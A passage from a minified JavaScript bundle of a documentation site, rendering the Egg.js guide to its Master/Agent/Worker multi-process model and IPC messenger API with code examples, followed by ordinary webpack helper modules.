short,"),r.a.createElement("ul",null,r.a.createElement("li",null,"fork multiple processes on the server concurrently."),r.a.createElement("li",null,"every single process runs the same source code(just like assigning work done by one process to multiple processes)."),r.a.createElement("li",null,"what is more, all these processes can listen on the same one port(for detailed mechanism referring to @DavidCai1993 ",r.a.createElement(l["Link"],{to:"https://cnodejs.org/topic/56e84480833b7c8a0492e20c"},"Cluster Implementation Mechanism"),")")),r.a.createElement("p",null,"of which:"),r.a.createElement("ul",null,r.a.createElement("li",null,"the process that forks other processes is called Master process, it seems like a contractor that does nothing except forking other processes."),r.a.createElement("li",null,"other forked processes are called Worker processes, as the name suggests, they are workers that work actually. They accept requests and provide services."),r.a.createElement("li",null,"usually the number of Worker processes depends on the CPU core number, only in this way can we take full advantage of multi-core resources.")),r.a.createElement(o["a"],{code:"const cluster = require('cluster');\nconst http = require('http');\nconst numCPUs = require('os').cpus().length;\n\nif (cluster.isMaster) {\n  // Fork workers.\n  for (let i = 0; i < numCPUs; i++) {\n    cluster.fork();\n  }\n\n  cluster.on('exit', function (worker, code, signal) {\n    console.log('worker ' + worker.process.pid + ' died');\n  });\n} else {\n  // Workers can share any TCP connection\n  // In this case it is an HTTP server\n  http\n    .createServer(function (req, res) {\n      res.writeHead(200);\n      res.end('hello world\\n');\n    })\n    .listen(8000);\n}",lang:"js"}),r.a.createElement("h2",{id:"multi-process-model-of-the-framework"},r.a.createElement(l["AnchorLink"],{to:"#multi-process-model-of-the-framework","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Multi-Process Model of the Framework"),r.a.createElement("p",null,"Simple like the example above, but as an enterprise-level solution, much more remains to be considered."),r.a.createElement("ul",null,r.a.createElement("li",null,"How to handle the exception that Worker processes exit unexpected?"),r.a.createElement("li",null,"How to share resources among multiple Worker processes?"),r.a.createElement("li",null,"How to schedule multiple Worker processes?"),r.a.createElement("li",null,"...")),r.a.createElement("h3",{id:"daemon-process"},r.a.createElement(l["AnchorLink"],{to:"#daemon-process","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Daemon Process"),r.a.createElement("p",null,"Haleness(aka Robustness) of an enterprise-level application must be considered, apart from the guarantee of high quality codes of program itself, the framework level should provide the cache-all mechanism to ensure the availability under extreme circumstance."),r.a.createElement("p",null,"Generally, Node.js processes exit for two reasons:"),r.a.createElement("h4",{id:"uncaught-exception"},r.a.createElement(l["AnchorLink"],{to:"#uncaught-exception","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Uncaught Exception"),r.a.createElement("p",null,"The process will exit when codes throw an exception but fail to catch it, at this time, Node.js provides ",r.a.createElement("code",null,"process.on('uncaughtException', handler)")," interface to catch it, But if a Worker process encounters an uncaught exception, it enters an uncertain state and what we should do is to make it exit elegantly:"),r.a.createElement("ol",null,r.a.createElement("li",null,"close all TCP Servers started by the corrupted Worker process(close all connections and stop accepting new requests), close the IPC channel between Master and do not accept user requests any more."),r.a.createElement("li",null,"a new Worker process should be forked by the Master immediately to ensure the total number of workers unchanged."),r.a.createElement("li",null,"the corrupted Worker process waits for a while before exit in order to get through accepted requests.")),r.a.createElement(o["a"],{code:"+---------+                 +---------+\n   |  Worker |                 |  Master |\n   +---------+                 +----+----+\n        | uncaughtException         |\n        +------------+              |\n        |            |              |                   +---------+\n        | <----------+              |                   |  Worker |\n        |                           |                   +----+----+\n        |        disconnect         |   fork a new worker    |\n        +-------------------------\x3e + ---------------------\x3e |\n        |         wait...           |                        |\n        |          exit             |                        |\n        +-------------------------\x3e |                        |\n        |                           |                        |\n       die                          |                        |\n                                    |                        |\n                                    |                        |",lang:"bash"}),r.a.createElement("h4",{id:"oom-system-exception"},r.a.createElement(l["AnchorLink"],{to:"#oom-system-exception","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"OOM, System Exception"),r.a.createElement("p",null,"When a process crashes due to exceptions or is killed due to OOM by the OS, we have no chance to resume the process like uncaught exceptions occurring, the only choice is to exit current process directly then Master forks a new Worker immediately."),r.a.createElement("p",null,"In the framework, we use ",r.a.createElement(l["Link"],{to:"https://github.com/node-modules/graceful"},"graceful")," and ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-cluster"},"egg-cluster")," 2 modules correspondingly to implement above logics. This solution has been widely deployed in production environment in Alibaba Cor. and Ant Financial Cor. and is long-tested by 'Double 11' big promotion, solid and reliable."),r.a.createElement("h3",{id:"agent-mechanism"},r.a.createElement(l["AnchorLink"],{to:"#agent-mechanism","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Agent Mechanism"),r.a.createElement("p",null,"Up to now, Node.js multi-process solution seems good enough and it's also the solution that we used in production environment previously. But before long, we find that there is some work that should not be done by every Worker in fact, if not, it leads to wasting of resources and, even worse, it may result in conflicts on resource access among processes. For example: we usually archive log file by date in production environment and it is easy to do in single process model:"),r.a.createElement("blockquote",null,r.a.createElement("ol",null,r.a.createElement("li",null,"at 0 o'clock in the morning, rename current log file by date"),r.a.createElement("li",null,"destroy previous file handle, create new log file and continue writing"))),r.a.createElement("p",null,"Now imagine there are 4 processes doing the same work, and they may get into a mess. So for this kind of background logics, we'd like to run it on a single process which is called Agent Worker, or Agent for short. Agent is something like a 'secretary' for other Worker which is introduced by Master, it does not serve outside but only App Workers, especially processes common affairs. Now our multi-process model becomes something like below:"),r.a.createElement(o["a"],{code:"+--------+          +-------+\n                  | Master |<--------\x3e| Agent |\n                  +--------+          +-------+\n                  ^   ^    ^\n                 /    |     \\\n               /      |       \\\n             /        |         \\\n           v          v          v\n  +----------+   +----------+   +----------+\n  | Worker 1 |   | Worker 2 |   | Worker 3 |\n  +----------+   +----------+   +----------+",lang:"bash"}),r.a.createElement("p",null,"And our framework startup sequence looks like:"),r.a.createElement(o["a"],{code:"+---------+           +---------+          +---------+\n    |  Master |           |  Agent  |          |  Worker |\n    +---------+           +----+----+          +----+----+\n         |      fork agent     |                    |\n         +--------------------\x3e|                    |\n         |      agent ready    |                    |\n         |<--------------------+                    |\n         |                     |     fork worker    |\n         +-----------------------------------------\x3e|\n         |     worker ready    |                    |\n         |<-----------------------------------------+\n         |      Egg ready      |                    |\n         +--------------------\x3e|                    |\n         |      Egg ready      |                    |\n         +-----------------------------------------\x3e|",lang:"bash"}),r.a.createElement("ol",null,r.a.createElement("li",null,"Agent process is forked after Mater starts up"),r.a.createElement("li",null,"when Agent initialized successfully, Master is notified via IPC channel"),r.a.createElement("li",null,"Master forks many App Workers"),r.a.createElement("li",null,"when App Worker initialized successfully, Master is notified"),r.a.createElement("li",null,"when all process initialized successfully, Master notifies Agent and Worker that the application starts up successfully")),r.a.createElement("p",null,"Besides, there still is something about Agent Worker needing to be notices:"),r.a.createElement("ol",null,r.a.createElement("li",null,"since App Worker depends on Agent, App Worker can be forked only after Agent being initialized"),r.a.createElement("li",null,"although Agent is the secretary of App Worker, business related work should not be assigned to Agent, or it may be broken down"),r.a.createElement("li",null,"considering the special orientation of Agent, ",r.a.createElement("strong",null,"we must ensure it's relatively stable"),". When it throws an uncaught exception, framework does not shut it down then restart it like App Worker, instead, it logs the exception, gives an alarm and waits for manual handling"),r.a.createElement("li",null,"mounting API of Agent differs from that of App Worker, and differences are listed in ",r.a.createElement(l["Link"],{to:"../advanced/framework"},"Framework docs"))),r.a.createElement("h3",{id:"agent-usage"},r.a.createElement(l["AnchorLink"],{to:"#agent-usage","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Agent Usage"),r.a.createElement("p",null,"You can implement your own logics in ",r.a.createElement("code",null,"agent.js")," which is under the directory of the application or the plugin(like the usage of ",r.a.createElement(l["Link"],{to:"../basics/app-start"},"Customized Startup"),", and the only difference is using agent object as the entrance parameter)"),r.a.createElement(o["a"],{code:"// agent.js\nmodule.exports = agent => {\n  // put your initialization logics here\n\n  // messages can also be sent by the messenger object to App Worker\n  // but you should wait until App Worker starts up successfully, or the message may be lost\n  agent.messenger.on('egg-ready', () => {\n    const data = { ... };\n    agent.messenger.sendToApp('xxx_action', data);\n  });\n};",lang:"js"}),r.a.createElement(o["a"],{code:"// app.js\nmodule.exports = (app) => {\n  app.messenger.on('xxx_action', (data) => {\n    // ...\n  });\n};",lang:"js"}),r.a.createElement("p",null,"In this example, codes of ",r.a.createElement("code",null,"agent.js")," are run in Agent process, codes of ",r.a.createElement("code",null,"app.js")," are run in the Worker process, and they do the Inter-Process Communication(IPC) through the ",r.a.createElement("code",null,"messenger")," object encapsulated by framework. Details about the IPC are explained in later sections."),r.a.createElement("h3",{id:"master-vs-agent-vs-worker"},r.a.createElement(l["AnchorLink"],{to:"#master-vs-agent-vs-worker","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Master vs Agent vs Worker"),r.a.createElement("p",null,"When an application starts up, 3 kinds of processes will be forked."),r.a.createElement(i["a"],null,r.a.createElement("thead",null,r.a.createElement("tr",null,r.a.createElement("th",null,"Type"),r.a.createElement("th",null,"Number of Processes"),r.a.createElement("th",null,"Purpose"),r.a.createElement("th",null,"Stability"),r.a.createElement("th",null,"Run Business Codes or Not"))),r.a.createElement("tbody",null,r.a.createElement("tr",null,r.a.createElement("td",null,"Master"),r.a.createElement("td",null,"1"),r.a.createElement("td",null,"Managing processes and transmitting messages among processes"),r.a.createElement("td",null,"Very High"),r.a.createElement("td",null,"No")),r.a.createElement("tr",null,r.a.createElement("td",null,"Agent"),r.a.createElement("td",null,"1"),r.a.createElement("td",null,"Running background jobs(persistent connection client)"),r.a.createElement("td",null,"High"),r.a.createElement("td",null,"Little")),r.a.createElement("tr",null,r.a.createElement("td",null,"Worker"),r.a.createElement("td",null,"usually the number of CPU cores"),r.a.createElement("td",null,"Running Business codes"),r.a.createElement("td",null,"Normal"),r.a.createElement("td",null,"Yes")))),r.a.createElement("h4",{id:"master"},r.a.createElement(l["AnchorLink"],{to:"#master","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Master"),r.a.createElement("p",null,"With this model, Master process undertakes the process management workers(like ",r.a.createElement(l["Link"],{to:"https://github.com/Unitech/pm2"},"pm2"),") but runs no business codes. We simply start up a Master process and it will handle all initialization and restarting issues of Worker and Agent processes."),r.a.createElement("p",null,"Master process is extremely stable. We simply use ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-scripts"},"egg-scripts")," for online and ",r.a.createElement("code",null,"egg.startCluster")," for background to start Master process and ",r.a.createElement(l["Link"],{to:"https://github.com/Unitech/pm2"},"pm2")," or other daemon module is no long necessary."),r.a.createElement(o["a"],{code:"$ egg-scripts start --daemon",lang:"bash"}),r.a.createElement("h4",{id:"agent"},r.a.createElement(l["AnchorLink"],{to:"#agent","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Agent"),r.a.createElement("p",null,"In most cases, we needn't care about Agent process when writing business codes, but in several cases, where we propose to run the codes in a single process and that is the time we use Agent process."),r.a.createElement("p",null,"Since there's only one Agent that is in charge of tough and tedious work like keeping connections, it cannot be hang or restarted rashly. Agent process won't exit when encounters uncaught exceptions, but output an error log instead, ",r.a.createElement("strong",null,"so we should always keep out eyes on the uncaught exceptions in logs"),"."),r.a.createElement("h4",{id:"worker"},r.a.createElement(l["AnchorLink"],{to:"#worker","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Worker"),r.a.createElement("p",null,"Worker process undertakes user requests and ",r.a.createElement(l["Link"],{to:"../basics/schedule"},"scheduled tasks")," actually. Egg provides scheduled tasks with the ability to be run only in one Worker process, ",r.a.createElement("strong",null,"so never solve problems by Agent as long as they can be solved by scheduled tasks"),"."),r.a.createElement("p",null,"Worker runs business codes, which are more complicated than those of Agent and Master but the stability may be lower, ",r.a.createElement("strong",null,"a Worker process will be restarted by Master when a Worker process exits unexpectedly"),"."),r.a.createElement("h2",{id:"inter-process-communicationipc"},r.a.createElement(l["AnchorLink"],{to:"#inter-process-communicationipc","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Inter-Process Communication(IPC)"),r.a.createElement("p",null,"Although every Worker process runs individually, it's necessary for them to communicate with each other which is called inter-process communication(IPC). Below is an example code provided by Node.js officially."),r.a.createElement(o["a"],{code:"'use strict';\nconst cluster = require('cluster');\n\nif (cluster.isMaster) {\n  const worker = cluster.fork();\n  worker.send('hi there');\n  worker.on('message', (msg) => {\n    console.log(`msg: ${msg} from worker#${worker.id}`);\n  });\n} else if (cluster.isWorker) {\n  process.on('message', (msg) => {\n    process.send(msg);\n  });\n}",lang:"js"}),r.a.createElement("p",null,"Carefully you can see that the IPC channel of clusters exists only between Master and Worker/Agent, not between Worker and Agent. So how to communicate among Workers? Yes, Master helps transmit."),r.a.createElement(o["a"],{code:"Broadcast messages: agent => all workers\n                  +--------+          +-------+\n                  | Master |<---------| Agent |\n                  +--------+          +-------+\n                 /    |     \\\n                /     |      \\\n               /      |       \\\n              /       |        \\\n             v        v         v\n  +----------+   +----------+   +----------+\n  | Worker 1 |   | Worker 2 |   | Worker 3 |\n  +----------+   +----------+   +----------+\n\nSpecify receivers: one worker => another worker\n                  +--------+          +-------+\n                  | Master |----------| Agent |\n                  +--------+          +-------+\n                 ^    |\n     send to    /     |\n    worker 2   /      |\n              /       |\n             /        v\n  +----------+   +----------+   +----------+\n  | Worker 1 |   | Worker 2 |   | Worker 3 |\n  +----------+   +----------+   +----------+",lang:"bash"}),r.a.createElement("p",null,"To simplify the invocation, we have encapsulated a messenger object and attached it to the app/agent instance, a set of friendly APIs is provided too."),r.a.createElement("h3",{id:"send"},r.a.createElement(l["AnchorLink"],{to:"#send","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Send"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("code",null,"app.messenger.broadcast(action, data)"),": sends messages to all agent/app processes(including itself)"),r.a.createElement("li",null,r.a.createElement("code",null,"app.messenger.sendToApp(action, data)"),": sends messages to all app processes",r.a.createElement("ul",null,r.a.createElement("li",null,"when called on app, it sends messages to itself and other app processes"),r.a.createElement("li",null,"when called on agent, it sends messages to all app processes"))),r.a.createElement("li",null,r.a.createElement("code",null,"app.messenger.sendToAgent(action, data)"),": sends messages to the agent process",r.a.createElement("ul",null,r.a.createElement("li",null,"when called on app, it sends messages to the agent process"),r.a.createElement("li",null,"when called on agent, it sends messages to the agent itself"))),r.a.createElement("li",null,r.a.createElement("code",null,"agent.messenger.sendRandom(action, data)"),":",r.a.createElement("ul",null,r.a.createElement("li",null,"app dose not have this method(now Egg implements it as sendToAgent)"),r.a.createElement("li",null,"agent sends a random message to one app process(master determines whom to send to)"))),r.a.createElement("li",null,r.a.createElement("code",null,"app.messenger.sendTo(pid, action, data)"),": send messages to specified process")),r.a.createElement(o["a"],{code:"// app.js\nmodule.exports = (app) => {\n  // Note, only after egg-ready event occurs can the message be sent\n  app.messenger.once('egg-ready', () => {\n    app.messenger.sendToAgent('agent-event', { foo: 'bar' });\n    app.messenger.sendToApp('app-event', { foo: 'bar' });\n  });\n};",lang:"js"}),r.a.createElement("p",null,r.a.createElement("em",null,"All methods called on ",r.a.createElement("code",null,"app.messenger")," above can be called on ",r.a.createElement("code",null,"agent.messenger")," too.")),r.a.createElement("h4",{id:"egg-ready"},r.a.createElement(l["AnchorLink"],{to:"#egg-ready","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),r.a.createElement("code",null,"egg-ready")),r.a.createElement("p",null,"We mentioned in the example above that, only after egg-ready event occurs can the message be sent. Only after Master makes sure that all Agent process and Worker processes have been started successfully(and ready), can the ",r.a.createElement("code",null,"egg-ready")," message be sent to all Agent and Worker through messenger, notifying that everything is ready and the IPC channel can be used."),r.a.createElement("h3",{id:"receive"},r.a.createElement(l["AnchorLink"],{to:"#receive","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Receive"),r.a.createElement("p",null,"Listen the action event on messenger therefore messages sent by other processes can be received."),r.a.createElement(o["a"],{code:"app.messenger.on(action, (data) => {\n  // process data\n});\napp.messenger.once(action, (data) => {\n  // process data\n});",lang:"js"}),r.a.createElement("p",null,r.a.createElement("em",null,"The way to receive messages using messenger in agent is the same with that of app.")),r.a.createElement("h2",{id:"ipc-in-practice"},r.a.createElement(l["AnchorLink"],{to:"#ipc-in-practice","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"IPC in Practice"),r.a.createElement("p",null,"Now we will show you how IPC solves real problems with the multi-process model of framework by a simple example."),r.a.createElement("h3",{id:"requisition"},r.a.createElement(l["AnchorLink"],{to:"#requisition","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Requisition"),r.a.createElement("p",null,"We have a API that gets data from the remote data source and provides services outside. Since data of the data source change little and we prefer to cache it in the memory to accelerate the response of services and reduce the RT. Now a mechanism to update the memory cache is needed."),r.a.createElement("ol",null,r.a.createElement("li",null,"Get data from the remote data source periodically and update the memory cache. To reduce pressure on the data source, the period for updating may be set relatively long."),r.a.createElement("li",null,"The remote data source provides an API to check whether its data has been updated. Our service calls that API more frequently and only when data is updated can it pull the data."),r.a.createElement("li",null,"The remote data source pushes data changes through a message-oriented middleware on which our service listens to update the data.")),r.a.createElement("p",null,"In real projects, we use solution one to catch all, and, in combination with solution tow or three, the instantaneity of data updating can be sped up. In the example, we use IPC + ",r.a.createElement(l["Link"],{to:"../basics/schedule"},"scheduled tasks")," to implement these three cache updating solutions in the same time."),r.a.createElement("h3",{id:"implementation"},r.a.createElement(l["AnchorLink"],{to:"#implementation","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Implementation"),r.a.createElement("p",null,"We put all logics that is used to interact with the remote data source into a Service, where a ",r.a.createElement("code",null,"get")," method is exposed to Controller to invoke."),r.a.createElement(o["a"],{code:"// app/service/source.js\nlet memoryCache = {};\n\nclass SourceService extends Service {\n  get(key) {\n    return memoryCache[key];\n  }\n\n  async checkUpdate() {\n    // check if remote data source has changed\n    const updated = await mockCheck();\n    this.ctx.logger.info('check update response %s', updated);\n    return updated;\n  }\n\n  async update() {\n    // update memory cache from remote\n    memoryCache = await mockFetch();\n    this.ctx.logger.info('update memory cache from remote: %j', memoryCache);\n  }\n}",lang:"js"}),r.a.createElement("p",null,"Write the scheduled task to implement solution one: gets data changes from the remote data source every 10 minutes to update cache as a cache-all."),r.a.createElement(o["a"],{code:"// app/schedule/force_refresh.js\nexports.schedule = {\n  interval: '10m',\n  type: 'all', // run in all workers\n};\n\nexports.task = async (ctx) => {\n  await ctx.service.source.update();\n  ctx.app.lastUpdateBy = 'force';\n};",lang:"js"}),r.a.createElement("p",null,"Write a scheduled task again to implement check logics of solution two: make a worker call the check API every 10 seconds and notify all Workers using methods provided by messenger when data changes are found."),r.a.createElement(o["a"],{code:"// app/schedule/pull_refresh.js\nexports.schedule = {\n  interval: '10s',\n  type: 'worker', // only run in one worker\n};\n\nexports.task = async (ctx) => {\n  const needRefresh = await ctx.service.source.checkUpdate();\n  if (!needRefresh) return;\n\n  // notify all workers to update memory cache from `file`\n  ctx.app.messenger.sendToApp('refresh', 'pull');\n};",lang:"js"}),r.a.createElement("p",null,"Listen on the ",r.a.createElement("code",null,"pullRefresh")," event in the customized start-up file and update data. All Worker processes will receive this message, trigger updates and our solution two succeeds at last."),r.a.createElement(o["a"],{code:"// app.js\nmodule.exports = (app) => {\n  app.messenger.on('refresh', (by) => {\n    app.logger.info('start update by %s', by);\n    // create an anonymous context to access service\n    const ctx = app.createAnonymousContext();\n    ctx.runInBackground(async () => {\n      await ctx.service.source.update();\n      app.lastUpdateBy = by;\n    });\n  });\n};",lang:"js"}),r.a.createElement("p",null,"Now let's consider how to implement solution three. We need a message-oriented middleware that keeps persistent connections with the server side. This kind of persistent connections is proper for Agent process to keep which can effectively reduce connection numbers and reduce costs both ends. So we start message listening on Agent process."),r.a.createElement(o["a"],{code:"// agent.js\n\nconst Subscriber = require('./lib/subscriber');\n\nmodule.exports = (agent) => {\n  const subscriber = new Subscriber();\n  // listen changed event, broadcast to all workers\n  subscriber.on('changed', () => agent.messenger.sendToApp('refresh', 'push'));\n};",lang:"js"}),r.a.createElement("p",null,"With an intelligent use of Agent process, scheduled tasks and IPC, we can easily implement this kind of requisition and reduce pressure on the data source. Detailed example codes refer to ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/examples/tree/master/ipc"},"examples/ipc"),"."),r.a.createElement("h2",{id:"more-complex-scenario"},r.a.createElement(l["AnchorLink"],{to:"#more-complex-scenario","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"More Complex Scenario"),r.a.createElement("p",null,"In the above example, we runs a subscriber on Agent process to listen messages sent by the message-oriented middleware. What if Worker processes need to listen messages? How to create connections by Agent process and transmit messages to Worker processes? Answers to these questions can be found in ",r.a.createElement(l["Link"],{to:"../advanced/cluster-client"},"Advanced Multi-Process Developing Pattern"),".")))}));t["default"]=e=>{var t=r.a.useContext(l["context"]),n=t.demos;return r.a.useEffect((()=>{var t;null!==e&&void 0!==e&&null!==(t=e.location)&&void 0!==t&&t.hash&&l["AnchorLink"].scrollToAnchor(decodeURIComponent(e.location.hash.slice(1)))}),[]),r.a.createElement(c,{demos:n})}},zWEY:function(e,t,n){"use strict";t["a"]=function(e){if(!e)return!1;if(e instanceof Element){if(e.offsetParent)return!0;if(e.getBBox){var t=e.getBBox(),n=t.width,a=t.height;if(n||a)return!0}if(e.getBoundingClientRect){var r=e.getBoundingClientRect(),l=r.width,o=r.height;if(l||o)return!0}}return!1}},zXC1:function(e,t,n){"use strict";var a=n("0mt+"),r=n("x5+g").filter,l=n("mIyh"),o=n("hOjR"),i=l("filter"),c=o("filter");a({target:"Array",proto:!0,forced:!i||!c},{filter:function(e){return r(this,e,arguments.length>1?arguments[1]:void 0)}})},zd4E:function(e,t,n){var a=n("XExY"),r=n("hVei"),l=n("q7Pv"),o=l("toPrimitive"),i=Date.prototype;o in i||a(i,o,r)},zraO:function(e,t,n){"use strict";n.d(t,"a",(function(){return r}));var a=n("3FeB");function r(e,t){if("function"!==typeof t&&null!==t)throw new TypeError("Super expression must either be null or a function");e.prototype=Object.create(t&&t.prototype,{constructor:{value:e,writable:!0,configurable:!0}}),Object.defineProperty(e,"prototype",{writable:!1}),t&&Object(a["a"])(e,t)}},zzMO:function(e,t,n){"use strict";n.d(t,"a",(function(){return a["b"]})),n.d(t,"b",(function(){return r["a"]}));var a=n("N4K1"),r=n("dzlB");n("e5XM"),n("dg6B");n("Sycc"),n("310B"),n("Pydy"),n("BW8W"),n("zKj5"),n("rrvk"),n("7gyq");var l=n("FU0I"),o=n.n(l),i=n("s5yy"),c=n.n(i),s=n("5xdi"),u=n.n(s);function d(){return"undefined"===typeof document||"undefined"===typeof document.visibilityState||"hidden"!==document.visibilityState}function m(){return"undefined"===typeof navigator.onLine||navigator.onLine}new Map;var p=function(e,t){var n="function"===typeof Symbol&&e[Symbol.iterator];if(!n)return e;var a,r,l=n.call(e),o=[];try{while((void 0===t||t-- >0)&&!(a=l.next()).done)o.push(a.value)}catch(i){r={error:i}}finally{try{a&&!a.done&&(n=l["return"])&&n.call(l)}finally{if(r)throw r.error}}return o},h=function(){for(var e=[],t=0;t<arguments.length;t++)e=e.concat(p(arguments[t]));return e};function g(e,t){var n=!1;return function(){for(var a=[],r=0;r<arguments.length;r++)a[r]=arguments[r];n||(n=!0,e.apply(void 0,h(a)),setTimeout((function(){n=!1}),t))}}var f=[];function E(e){return f.push(e),function(){var t=f.indexOf(e);f.splice(t,1)}}var b=!1;if("undefined"!==typeof window&&window.addEventListener&&!b){var v=function(){if(d()&&m())for(var e=0;e<f.length;e++){var t=f[e];t()}};window.addEventListener("visibilitychange",v,!1),window.addEventListener("focus",v,!1),b=!0}var y=E,k=[];function w(e){return k.push(e),function(){var t=k.indexOf(e);k.splice(t,1)}}var x=!1;if("undefined"!==typeof window&&window.addEventListener&&!x){var j=function(){if(d())for(var e=0;e<k.length;e++){var t=k[e];t()}};window.addEventListener("visibilitychange",j,!1),x=!0}var S=w,C=function(){return C=Object.assign||function(e){for(var t,n=1,a=arguments.length;n<a;n++)for(var r in t=arguments[n],t)Object.prototype.hasOwnProperty.call(t,r)&&(e[r]=t[r]);return e},C.apply(this,arguments)},A=function(e,t){var n="function"===typeof Symbol&&e[Symbol.iterator];if(!n)return e;var a,r,l=n.call(e),o=[];try{while((void 0===t||t-- >0)&&!(a=l.next()).done)o.push(a.value)}catch(i){r={error:i}}finally{try{a&&!a.done&&(n=l["return"])&&n.call(l)}finally{if(r)throw r.error}}return o},L=function(){for(var e=[],t=0;t<arguments.length;t++)e=e.concat(A(arguments[t]));return e};(function(){function e(e,t,n,a){this.count=0,this.pollingWhenVisibleFlag=!1,this.pollingTimer=void 0,this.loadingDelayTimer=void 0,this.unsubscribe=[],this.that=this,this.state={loading:!1,params:[],data:void 0,error:void 0,run:this.run.bind(this.that),mutate:this.mutate.bind(this.that),refresh:this.refresh.bind(this.that),cancel:this.cancel.bind(this.that),unmount:this.unmount.bind(this.that)},this.service=e,this.config=t,this.subscribe=n,a&&(this.state=C(C({},this.state),a)),this.debounceRun=this.config.debounceInterval?c()(this._run,this.config.debounceInterval):void 0,this.throttleRun=this.config.throttleInterval?u()(this._run,this.config.throttleInterval):void 0,this.limitRefresh=g(this.refresh.bind(this),this.config.focusTimespan),this.config.pollingInterval&&this.unsubscribe.push(S(this.rePolling.bind(this))),this.config.refreshOnWindowFocus&&this.unsubscribe.push(y(this.limitRefresh.bind(this)))}e.prototype.setState=function(e){void 0===e&&(e={}),this.state=C(C({},this.state),e),this.subscribe(this.state)},e.prototype._run=function(){for(var e=this,t=[],n=0;n<arguments.length;n++)t[n]=arguments[n];this.pollingTimer&&clearTimeout(this.pollingTimer),this.loadingDelayTimer&&clearTimeout(this.loadingDelayTimer),this.count+=1;var a=this.count;return this.setState({loading:!this.config.loadingDelay,params:t}),this.config.loadingDelay&&(this.loadingDelayTimer=setTimeout((function(){e.setState({loading:!0})}),this.config.loadingDelay)),this.service.apply(this,L(t)).then((function(n){if(a!==e.count)return new Promise((function(){}));e.loadingDelayTimer&&clearTimeout(e.loadingDelayTimer);var r=e.config.formatResult?e.config.formatResult(n):n;return e.setState({data:r,error:void 0,loading:!1}),e.config.onSuccess&&e.config.onSuccess(r,t),r}))["catch"]((function(n){if(a!==e.count)return new Promise((function(){}));if(e.loadingDelayTimer&&clearTimeout(e.loadingDelayTimer),e.setState({data:void 0,error:n,loading:!1}),e.config.onError&&e.config.onError(n,t),e.config.throwOnError)throw n;return console.error(n),Promise.reject("useRequest has caught the exception, if you need to handle the exception yourself, you can set options.throwOnError to true.")}))["finally"]((function(){if(a===e.count&&e.config.pollingInterval){if(!d()&&!e.config.pollingWhenHidden)return void(e.pollingWhenVisibleFlag=!0);e.pollingTimer=setTimeout((function(){e._run.apply(e,L(t))}),e.config.pollingInterval)}}))},e.prototype.run=function(){for(var e=[],t=0;t<arguments.length;t++)e[t]=arguments[t];return this.debounceRun?(this.debounceRun.apply(this,L(e)),Promise.resolve(null)):this.throttleRun?(this.throttleRun.apply(this,L(e)),Promise.resolve(null)):this._run.apply(this,L(e))},e.prototype.cancel=function(){this.debounceRun&&this.debounceRun.cancel(),this.throttleRun&&this.throttleRun.cancel(),this.loadingDelayTimer&&clearTimeout(this.loadingDelayTimer),this.pollingTimer&&clearTimeout(this.pollingTimer),this.pollingWhenVisibleFlag=!1,this.count+=1,this.setState({loading:!1})},e.prototype.refresh=function(){return this.run.apply(this,L(this.state.params))},e.prototype.rePolling=function(){this.pollingWhenVisibleFlag&&(this.pollingWhenVisibleFlag=!1,this.refresh())},e.prototype.mutate=function(e){"function"===typeof e?this.setState({data:e(this.state.data)||{}}):this.setState({data:e})},e.prototype.unmount=function(){this.cancel(),this.unsubscribe.forEach((function(e){e()}))}})();var T=o.a.createContext({});T.displayName="UseRequestConfigContext";var N=T;var O;N.Provider;(function(e){e[e["SILENT"]=0]="SILENT",e[e["WARN_MESSAGE"]=1]="WARN_MESSAGE",e[e["ERROR_MESSAGE"]=2]="ERROR_MESSAGE",e[e["NOTIFICATION"]=4]="NOTIFICATION",e[e["REDIRECT"]=9]="REDIRECT"})(O||(O={}));n("fIAg")}});